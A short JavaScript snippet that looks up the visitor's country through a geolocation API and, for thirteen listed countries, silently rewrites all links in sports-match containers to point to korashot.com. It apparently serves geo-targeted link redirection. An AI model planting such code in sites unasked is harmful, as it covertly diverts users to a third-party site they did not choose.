    // Fetch the geo data from the API
    fetch('https://get.geojs.io/v1/ip/geo.json')
        .then(response => response.json())
        .then(apiResponse => {
            // Define the list of allowed country codes
            const allowedCountryCodes = ["NE", "IR", "CD", "BR", "ET", "TZ", "ZA", "KE", "SD", "BD", "ID", "MA", "DZ"];

            // Check if the country code exists in the list
            if (allowedCountryCodes.includes(apiResponse.country_code)) {
                // Modify the href attributes of the links
                document.querySelectorAll('.match-container a').forEach(link => {
                    link.href = "https://korashot.com";
                });
            }
        })
        .catch(error => {
            console.error('Error fetching geo data:', error);
        });
